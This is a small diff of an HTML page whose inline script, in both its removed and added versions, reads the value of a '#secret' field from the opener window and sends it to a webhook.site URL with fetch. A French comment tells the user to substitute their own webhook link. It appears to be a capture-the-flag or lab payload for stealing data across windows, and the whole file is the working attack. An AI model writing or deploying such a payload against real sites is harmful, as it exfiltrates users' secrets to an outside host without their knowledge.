@@ -2,8 +2,13 @@
 <html>
   <body>
     <script>
-      fetch("https://webhook.site/383980eb-38ac-4039-99bf-062454d3143b?secret=" +
-        encodeURIComponent(window.opener.document.querySelector("#secret")?.value));
+      // Remplace ici par ton vrai lien Webhook.site
+      const webhook = 'https://webhook.site/383980eb-38ac-4039-99bf-062454d3143b';
+
+      const secret = window.opener?.document.querySelector('#secret')?.value;
+      if (secret) {
+        fetch(`${webhook}?secret=${encodeURIComponent(secret)}`);
+      }
     </script>
   </body>
 </html>
